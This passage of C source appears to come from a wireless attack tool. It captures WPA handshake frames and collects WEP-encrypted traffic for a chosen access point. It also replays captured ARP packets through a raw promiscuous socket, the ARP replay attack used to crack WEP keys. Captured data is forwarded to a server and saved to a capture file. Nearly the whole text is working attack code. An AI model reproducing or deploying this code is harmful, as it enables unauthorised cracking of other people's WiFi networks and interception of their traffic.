					//printf("capture key message msg_id %d\n",eapol_info.msg_id);

					if (eapol_info.msg_id != KEY_MESSAGE_NONE){ // valid eapol packet
						if(memcmp(bssid, src, 6) == 0) {//ap mac
							memcpy(eapol_info.ap_mac, src, sizeof(eapol_info.ap_mac));
							memcpy(eapol_info.sta_mac, dst, sizeof(eapol_info.sta_mac));
						} else {
							memcpy(eapol_info.ap_mac, dst, sizeof(eapol_info.ap_mac));
							memcpy(eapol_info.sta_mac, src, sizeof(eapol_info.sta_mac));
						}

						add_eapol_packet(&eapol_info, pkthdr, packet);
					}
				}
			}
		}

	return 1;
#if 0
	if((subType== Beacon) && (Type == DataFrame)){ //qos data frame
		printf("%s %d\n",__func__,__LINE__);
//		for(int i=0;i<pkthdr->caplen;i++)
//		{
//			printf("%#02x,",packet[i]);
//		}
//		printf("\n");
		printf("%#02x,%#02x,%#02x,%#02x\n",pdata[32],pdata[33],pdata[35],pdata[38]);
		if((pdata[32] == 0x88) && (pdata[33] == 0x8e)
		&& (pdata[35] == 0x03) && (pdata[38] == 0x02)){ //EAPOL
			uint16_t flag, type;
			memcpy(&flag, pdata+39, 2);
			flag=ntohs(flag);
			type = (flag>>6) & 0xf;
			printf("flag %#02x fff %#02x type %#02x\n",flag,flag>>6,type);
			if (type == 0x04)
				eapol_info.msg_id = KEY_MESSAGE_1;
			else if (type == 0x02)
				eapol_info.msg_id = KEY_MESSAGE_2;
			else if (type == 0x0f)
				eapol_info.msg_id = KEY_MESSAGE_3;
			else if (type == 0x0c)
				eapol_info.msg_id = KEY_MESSAGE_4;
			else
				eapol_info.msg_id = KEY_MESSAGE_NONE;
			printf("capture key message msg_id %d\n",eapol_info.msg_id);

			if (eapol_info.msg_id != KEY_MESSAGE_NONE){ // valid eapol packet
				if(memcmp(bssid, src, 6) == 0) {//ap mac
					memcpy(eapol_info.ap_mac, src, sizeof(eapol_info.ap_mac));
					memcpy(eapol_info.sta_mac, dst, sizeof(eapol_info.sta_mac));
				} else {
					memcpy(eapol_info.ap_mac, dst, sizeof(eapol_info.ap_mac));
					memcpy(eapol_info.sta_mac, src, sizeof(eapol_info.sta_mac));
				}

				add_eapol_packet(&eapol_info, pkthdr, packet);
			}
		}
	}
	else if((subType== ProbeResponse) && (Type == ManagementFrame)){ //qos data frame
		for(int i=0; i<MAX_CAP_STA_NUM; i++){
			if((EapolInfo[i].msg_id &0x10)==0x0){ // capture 4 key message packet
				memcpy(packet_data[i] + packet_data_len[i], (void*)pkthdr, sizeof(struct pcap_pkthdr)); // save pcap_pkthdr
//				tmppkthdr=(struct pcap_pkthdr *)(packet_data[i] + packet_data_len[i]);
//				tmppkthdr->len +=sizeof(crc_result);
//				tmppkthdr->caplen+=sizeof(crc_result);

				packet_data_len[i] += sizeof(struct pcap_pkthdr);

				memcpy(packet_data[i] + packet_data_len[i], packet,pkthdr->caplen); // save packet data
				packet_data_len[i] += pkthdr->caplen;
//				crc_result = crc32(0xffffffff, (uint8_t *)packet, pkthdr->caplen);
//				memcpy(packet_data[i] + packet_data_len[i], (void *)&crc_result,sizeof(crc_result)); // crc
//				packet_data_len[i] += sizeof(crc_result);

				EapolInfo[i].msg_id |=0x10;
				printf("%s %d i %d msgid %#02x\n",__func__,__LINE__,i,EapolInfo[i].msg_id);
				if(EapolInfo[i].msg_id == 0x1f){
					printf("%s %d i %d\n",__func__,__LINE__,i);
					trans_file(packet_data[i], packet_data_len[i]);
					packet_data_len[i]=4+sizeof(pcapfilehead_t);
					EapolInfo[i].msg_id=0;
				}
			}
		}
	}
	return 1;
#endif
}
static unsigned long calc_crc_osdep(unsigned char *buf, int len)
{
	unsigned long crc = 0xFFFFFFFF;

	for (; len > 0; len--, buf++)
		crc = crc_tbl_osdep[(crc ^ *buf) & 0xFF] ^ (crc >> 8);

	return (~crc);
}

static int check_crc_buf_osdep(unsigned char *buf, int len)
{
	unsigned long crc;

	if (len < 0)
		return 0;

	crc = calc_crc_osdep(buf, len);
	buf += len;
	return (((crc)&0xFF) == buf[0] && ((crc >> 8) & 0xFF) == buf[1] && ((crc >> 16) & 0xFF) == buf[2] && ((crc >> 24) & 0xFF) == buf[3]);
}
int do_wifi_wep_decypt(const struct pcap_pkthdr *pkthdr, uint8_t *packet,  uint8_t *ap_mac,  uint8_t *sta_mac)
{
	// int socket_fd = 0;
	int z = 0;
	int f_minlen = 0, f_maxlen = 0;
	uint8_t dst_mac[6];
	memset(dst_mac, 0xFF, 6);
	int h80211_len = 0;
	struct pcap_pkthdr_32bit pkthdr_temp;
	struct ieee80211_radiotap_header *radiotap_header = (struct ieee80211_radiotap_header *)packet;
	if ((get_unaligned_le16(&radiotap_header->it_len) < 0) && (get_unaligned_le16(&radiotap_header->it_len) > pkthdr->caplen))
		return -1;
	uint8_t *h80211 = packet + get_unaligned_le16(&radiotap_header->it_len);
	h80211_len = pkthdr->caplen - get_unaligned_le16(&radiotap_header->it_len);
	ap_mac=WifiDecrypt.bssid;
	sta_mac=WifiDecrypt.sta;
	if(!h80211)
		return -1;



	struct ieee80211_radiotap_iterator iterator;
	int fcs_removed = 0;
	int i = 0;
	if (ieee80211_radiotap_iterator_init(&iterator, radiotap_header, pkthdr->caplen, NULL) < 0)
		return (0);
	while ((ieee80211_radiotap_iterator_next(&iterator) >= 0))
	{

		switch (iterator.this_arg_index)
		{
		case IEEE80211_RADIOTAP_FLAGS:
			/* is the CRC visible at the end?
				 * remove
				 */
			if (*iterator.this_arg & IEEE80211_RADIOTAP_F_FCS)
			{
				fcs_removed = 1;
				h80211_len -= 4;
			}

			if (*iterator.this_arg & IEEE80211_RADIOTAP_F_BADFCS)
				return (0);

			break;
		}
	}
	if (h80211[1] == 0x41){
		if (memcmp(ap_mac, h80211 + 4, ETHER_ADDR_LEN) == 0){ //判断BSSID是否满足要求

			pcap_hdr_cpy((uint8_t *)&pkthdr_temp, pkthdr);
			pkthdr_temp.caplen = h80211_len;
			pkthdr_temp.len = h80211_len;
#if WEP_FILE_OPEN
			fwrite(&pkthdr_temp,sizeof(struct pcap_pkthdr_32bit),1,Wep_File);
			fwrite(h80211,pkthdr_temp.caplen,1,Wep_File);
			fflush(Wep_File);
#endif
			memcpy(Wep_Data+Wep_Len,&pkthdr_temp,sizeof(struct pcap_pkthdr_32bit));
			Wep_Len+=sizeof(struct pcap_pkthdr_32bit);
			memcpy(Wep_Data+Wep_Len,h80211,pkthdr_temp.caplen);
			Wep_Len+=pkthdr_temp.caplen;
			if(memcmp(sta_mac, h80211 + 10, ETHER_ADDR_LEN) == 0||memcmp(sta_mac, h80211 + 16, ETHER_ADDR_LEN) == 0){
				arp_data.arp_save_count++;
			}

		}
		else{
			return -1;
		}
	}
	else if(h80211[1] == 0x42){
		if (memcmp(ap_mac, h80211 + 10, ETHER_ADDR_LEN) == 0){ //判断BSSID是否满足要求
			pcap_hdr_cpy((uint8_t *)&pkthdr_temp, pkthdr);
			pkthdr_temp.caplen = h80211_len;
			pkthdr_temp.len = h80211_len;
#if WEP_FILE_OPEN
			fwrite(&pkthdr_temp,sizeof(struct pcap_pkthdr_32bit),1,Wep_File);
			fwrite(h80211,pkthdr_temp.caplen,1,Wep_File);
			fflush(Wep_File);
#endif
			memcpy(Wep_Data+Wep_Len,&pkthdr_temp,sizeof(struct pcap_pkthdr_32bit));
			Wep_Len+=sizeof(struct pcap_pkthdr_32bit);
			memcpy(Wep_Data+Wep_Len,h80211,pkthdr_temp.caplen);
			Wep_Len+=pkthdr_temp.caplen;
			if(memcmp(sta_mac, h80211 + 4, ETHER_ADDR_LEN) == 0||memcmp(sta_mac, h80211 + 16, ETHER_ADDR_LEN) == 0){
				arp_data.arp_save_count++;
			}
		}
		else{
			return -1;
		}
	}
	else {
		return -1;
	}
	if(arp_data.arp_save_count > WEP_MAX_NUM ||(Wep_Len +86) >=WEP_BUF_MAX_LEN){ //抓够数据包或者超过20M数据
		printf("send wep packet to server %d\n",Wep_Len);

		trans_file(Wep_Data, Wep_Len);
		FILE *tmp_file = fopen("./ba.cap", "wb");
		fwrite(Wep_Data+36,Wep_Len-36,1,tmp_file);
		fclose(tmp_file);
		arp_data.arp_save_count=0;
		Wep_Len=0;
		return 0;
	}
	if (fcs_removed == 0 && check_crc_buf_osdep(h80211, h80211_len - 4) == 1)
	{
		h80211_len -= 4;
	}
	//arp_data.arp_save_count++;
	f_minlen = f_maxlen = 68;
	if (arp_filter_packet(h80211, h80211_len, f_minlen, f_maxlen, ap_mac, sta_mac, dst_mac) == 0)
		goto add_arp;
	f_minlen = f_maxlen = 86;
	if (arp_filter_packet(h80211, h80211_len, f_minlen, f_maxlen, ap_mac, sta_mac, dst_mac) == 0)
	{
	add_arp:
		z = ((h80211[1] & 3) != 3) ? 24 : 30;
		if ((h80211[0] & 0x80) == 0x80) /* QoS */
			z += 2;
		switch (h80211[1] & 3)
		{
		case 1: /* ToDS */
		{
			/* keep as a ToDS packet */

			memcpy(h80211 + 4, ap_mac, 6);
			memcpy(h80211 + 10, sta_mac, 6);
			memcpy(h80211 + 16, dst_mac, 6);

			h80211[1] = 0x41; /* ToDS & WEP  */
		}
		break;
		case 2: /* FromDS */
		{
			memcpy(h80211 + 4, ap_mac, 6);
			memcpy(h80211 + 10, sta_mac, 6);
			memcpy(h80211 + 16, dst_mac, 6);

			h80211[1] = 0x41; /* ToDS & WEP  */
		}
		break;
		}
		for (i = 0; i < arp_data.nb_arp; i++)
		{
			if (memcmp(h80211 + z, arp_data.arp_packet[i] + arp_data.hdrlen[i], 4) == 0)
				goto end;
		}
		if (i < arp_data.nb_arp)
			goto end;
		if (h80211_len > 128)
			goto end;
		arp_data.arp_count++;
		if (arp_data.nb_arp >= 8)
		{
			memcpy((uint8_t *)arp_data.arp_packet[arp_data.arp_off2], h80211, h80211_len);
			arp_data.arp_packet_len[arp_data.arp_off2] = h80211_len;
			arp_data.hdrlen[arp_data.arp_off2] = z;

			if (++arp_data.arp_off2 >= arp_data.nb_arp)
				arp_data.arp_off2 = 0;
		}
		else
		{
			memcpy((uint8_t *)arp_data.arp_packet[arp_data.nb_arp], h80211, h80211_len);
			arp_data.arp_packet_len[arp_data.nb_arp] = h80211_len;
			arp_data.hdrlen[arp_data.nb_arp] = z;
			arp_data.nb_arp++;
		}
	}
end:
	return 0;
}
/*****************************************************************
 * 函数描述：arp包过滤函数
 * 参数：		const struct pcap_pkthdr * pkthdr  pcap缓存指针
 * 			const uint8_t * packet	数据帧缓存
 * 			uint8_t *bssid bssid
 *			uint8_t *src	源mac
 *			uint8_t *dst    目的mac
 * 返回值： 0 ：解析成功
 * 		   1：解析失败
 * ***************************************************************/
int arp_filter_packet(unsigned char *h80211, int caplen, int f_minlen, int f_maxlen, uint8_t *ap_mac, uint8_t *sta_mac, uint8_t *dst_mac)
{
	// REQUIRE(h80211 != NULL);
	int f_subtype = 0;
	int f_iswep = 1;
	int f_tods = -1;
	int f_fromds = -1;
	int f_type = 2;
	int z, mi_b, mi_s, mi_d, ext = 0;

	if (caplen <= 0)
		return (1);
	z = ((h80211[1] & IEEE80211_FC1_DIR_MASK) != IEEE80211_FC1_DIR_DSTODS) ? 24 : 30;
	if ((h80211[0] & IEEE80211_FC0_SUBTYPE_BEACON) == IEEE80211_FC0_SUBTYPE_BEACON)
	{
		/* 802.11e QoS */
		z += 2;
	}
	if ((h80211[0] & IEEE80211_FC0_TYPE_MASK) == IEEE80211_FC0_TYPE_DATA) // if data packet
		ext = z - 24;													  // how many bytes longer than default ieee80211 header

	/* check length */
	if (caplen - ext < f_minlen || caplen - ext > f_maxlen)
		return (1);
	/* check the frame control bytes */
	if ((h80211[0] & IEEE80211_FC0_TYPE_MASK) != (f_type << 2) && f_type >= 0)
		return (1);
	if ((h80211[0] & IEEE80211_FC0_SUBTYPE_CF_ACK_CF_ACK) !=
			((f_subtype << 4) & 0x70) && // ignore the leading bit (QoS)
		f_subtype >= 0)
		return (1);
	if ((h80211[1] & IEEE80211_FC1_DIR_TODS) != (f_tods) && f_tods >= 0)
		return (1);
	if ((h80211[1] & IEEE80211_FC1_DIR_FROMDS) != (f_fromds << 1) && f_fromds >= 0)
		return (1);
	if ((h80211[1] & IEEE80211_FC1_PROTECTED) != (f_iswep << 6) && f_iswep >= 0)
		return (1);
	if (f_type == 2 && f_iswep == 1 && (h80211[z + 3] & 0x20) != 0)
		return (1);
	/* MAC address checking */

	switch (h80211[1] & IEEE80211_FC1_DIR_MASK)
	{
	case IEEE80211_FC1_DIR_NODS:
		mi_b = 16;
		mi_s = 10;
		mi_d = 4;
		break;
	case IEEE80211_FC1_DIR_TODS:
		mi_b = 4;
		mi_s = 10;
		mi_d = 16;
		break;
	case IEEE80211_FC1_DIR_FROMDS:
		mi_b = 10;
		mi_s = 16;
		mi_d = 4;
		break;
	case IEEE80211_FC1_DIR_DSTODS:
		mi_b = 10;
		mi_d = 16;
		mi_s = 24;
		break;
	default:
		return 1;
	}
	if (memcmp(ap_mac, NULL_MAC, ETHER_ADDR_LEN) != 0)
		if (memcmp(h80211 + mi_b, ap_mac, ETHER_ADDR_LEN) != 0){
			return (1);
		}

	if (memcmp(ap_mac, sta_mac, ETHER_ADDR_LEN) == 0)
	{
		if (memcmp(sta_mac, NULL_MAC, ETHER_ADDR_LEN) != 0)
			if (memcmp(h80211 + mi_s, sta_mac, ETHER_ADDR_LEN - 1) != 0){
				return (1);
			}
	}
	else
	{
		if (memcmp(sta_mac, NULL_MAC, ETHER_ADDR_LEN) != 0)
			if (memcmp(h80211 + mi_s, sta_mac, ETHER_ADDR_LEN) != 0){
				return (1);
			}

	}
	if (memcmp(ap_mac, dst_mac, ETHER_ADDR_LEN) == 0)
	{
		if (memcmp(dst_mac, NULL_MAC, ETHER_ADDR_LEN) != 0)
			if (memcmp(h80211 + mi_d, dst_mac, ETHER_ADDR_LEN - 1) != 0){
				return (1);
			}
	}
	else
	{
		if (memcmp(dst_mac, NULL_MAC, ETHER_ADDR_LEN) != 0)
			if (memcmp(h80211 + mi_d, dst_mac, ETHER_ADDR_LEN) != 0){
				return (1);
			}
	}
	/* this one looks good */

	return (0);
}

void *send_buffer_thread(void * argv)
{
	printf("1--------------------------------------------\n");
	int socket_fd = 0;
	struct ifreq ifr;
	struct packet_mreq mr;
	float f, ticks[3];
	char cdev[20],cbuf[128];
	int ret = 0;
	struct timeval tv;
	struct timeval tv2;
	struct sockaddr_ll sll;
	unsigned char tmpbuf[4096];
	long send_count = 0;
	memset(ticks, 0, sizeof(ticks));
	// int pcap_file_fd2 = open("bc.pcap", O_WRONLY | O_APPEND);
	unsigned char u8aRadiotap[] __attribute__((aligned(8))) = {
		0x00,
		0x00, // <-- radiotap version
		0x0c,
		0x00, // <- radiotap header length
		0x04,
		0x80,
		0x00,
		0x00, // <-- bitmap
		0x00, // <-- rate
		0x00, // <-- padding for natural alignment
		0x18,
		0x00, // <-- TX flags
	};
	u8aRadiotap[8] = 2;

	if ((socket_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		printf("err: %s, %d\n", __func__, __LINE__);
		perror("socket(PF_PACKET) failed\n");
		return NULL;
	}
	memset(&ifr, 0, sizeof(ifr));
	char temp_string[20] = {'0'};
	strcpy(cdev,UserCfgJson.wlan_dev[AtkInfo.band]);
	sprintf (temp_string, "%.*s", strlen(cdev), cdev);
	strncpy(ifr.ifr_name, temp_string, strlen(cdev));
	if (ioctl(socket_fd, SIOCGIFINDEX, &ifr) != 0)
	{
		printf("err: %s, %d\n", __func__, __LINE__);
		perror("ioctl(SIOCGIFINDEX) failed\n");
		return NULL;
	}
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifr.ifr_ifindex;
	sll.sll_protocol = htons(ETH_P_ALL);
	if (bind(socket_fd, (struct sockaddr *)&sll, sizeof(sll)) != 0)
	{
		printf("err: %s, %d\n", __func__, __LINE__);
		perror("bind(ETH_P_ALL) failed");
		return NULL;
	}

	memset(&mr, 0, sizeof(mr));
	mr.mr_ifindex = sll.sll_ifindex;
	mr.mr_type = PACKET_MR_PROMISC;
	if (setsockopt(socket_fd, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof(mr)) != 0)
	{
		printf("err: %s, %d\n", __func__, __LINE__);
		perror("setsockopt(PACKET_MR_PROMISC) failed");
		return NULL;
	}
	while (DecryptOn)
	{
		gettimeofday(&tv, NULL);
		usleep(1000000 / RTC_RESOLUTION);
		gettimeofday(&tv2, NULL);

		f = 1000000.f * (float)(tv2.tv_sec - tv.tv_sec) + (float)(tv2.tv_usec - tv.tv_usec);

		ticks[0] += f / (1000000.f / RTC_RESOLUTION);
		ticks[1] += f / (1000000.f / RTC_RESOLUTION);
		ticks[2] += f / (1000000.f / RTC_RESOLUTION);
		if (ticks[1] > (RTC_RESOLUTION / 10.f))
		{
			ticks[1] = 0;
			printf("\rsend packet count is %ld, arp_packet count is %d, ack_count is %d....\r", send_count, arp_data.arp_save_count, arp_data.ack_count);
			fflush(stdout);
			// fflush(stdout);
		}
		if ((ticks[2] * 500) / RTC_RESOLUTION >= 1)
		{
			/* threshold reach, send one frame */
			ticks[2] = 0;
			if (arp_data.nb_arp > 0)
			{
				if (send_count == 0)
					ticks[0] = 0;
				// temp_pkh.ts.tv_sec = tv.tv_sec;
				// temp_pkh.ts.tv_usec = tv.tv_usec;
				// temp_pkh.caplen = arp_data.arp_packet_len[arp_data.arp_off1] + sizeof(u8aRadiotap);
				// temp_pkh.len = arp_data.arp_packet_len[arp_data.arp_off1] + sizeof(u8aRadiotap);
				if ((arp_data.arp_packet_len[arp_data.arp_off1] > 24) && (arp_data.arp_packet[arp_data.arp_off1][1] & 0x04) == 0 && (arp_data.arp_packet[arp_data.arp_off1][22] & 0x0F) == 0)
				{
					arp_data.arp_packet[arp_data.arp_off1][22] = (uint8_t)((send_count & 0x0000000F) << 4);
					arp_data.arp_packet[arp_data.arp_off1][23] = (uint8_t)((send_count & 0x00000FF0) >> 4);
				}

				memcpy(tmpbuf, u8aRadiotap, sizeof(u8aRadiotap));
				memcpy(tmpbuf + sizeof(u8aRadiotap), arp_data.arp_packet[arp_data.arp_off1], arp_data.arp_packet_len[arp_data.arp_off1]);
				// write(pcap_file_fd2, &temp_pkh, sizeof(temp_pkh));
				// write(pcap_file_fd2, tmpbuf, temp_pkh.caplen);

				do
				{
					ret = write(socket_fd, tmpbuf, arp_data.arp_packet_len[arp_data.arp_off1] + sizeof(u8aRadiotap));
					if (ret == -1 && errno == ENOBUFS)
					{
						usleep(10000);
					}
				} while (ret == -1 && (errno == EAGAIN || errno == ENOBUFS));

				if (ret == -1)
				{
					perror("write error()");
					return (-1);
				}
				send_count++;

				if (((double)ticks[0] / (double)RTC_RESOLUTION) * (double)500 > (double)send_count)
				{
					// temp_pkh.caplen = arp_data.arp_packet_len[arp_data.arp_off1] + sizeof(u8aRadiotap);
					// temp_pkh.len = arp_data.arp_packet_len[arp_data.arp_off1] + sizeof(u8aRadiotap);
					if ((arp_data.arp_packet_len[arp_data.arp_off1] > 24) && (arp_data.arp_packet[arp_data.arp_off1][1] & 0x04) == 0 && (arp_data.arp_packet[arp_data.arp_off1][22] & 0x0F) == 0)
					{
						arp_data.arp_packet[arp_data.arp_off1][22] = (uint8_t)((send_count & 0x0000000F) << 4);
						arp_data.arp_packet[arp_data.arp_off1][23] = (uint8_t)((send_count & 0x00000FF0) >> 4);
					}
					memcpy(tmpbuf, u8aRadiotap, sizeof(u8aRadiotap));
					memcpy(tmpbuf + sizeof(u8aRadiotap), arp_data.arp_packet[arp_data.arp_off1], arp_data.arp_packet_len[arp_data.arp_off1]);
					// write(pcap_file_fd2, &temp_pkh, sizeof(temp_pkh));
					// write(pcap_file_fd2, tmpbuf, temp_pkh.caplen);
					do
					{
						ret = write(socket_fd, tmpbuf, arp_data.arp_packet_len[arp_data.arp_off1] + sizeof(u8aRadiotap));
						if (ret == -1 && errno == ENOBUFS)
						{
							usleep(10000);
						}
					} while (ret == -1 && (errno == EAGAIN || errno == ENOBUFS));

					if (ret == -1)
					{
						perror("write error()");
						return (-1);
					}
					send_count++;
				}
				if (++arp_data.arp_off1 >= arp_data.nb_arp)
					arp_data.arp_off1 = 0;
			}
		}
		// usleep(500);
	}
	// close(pcap_file_fd2);
	printf("2--------------------------------------------\n");
	return NULL;
}
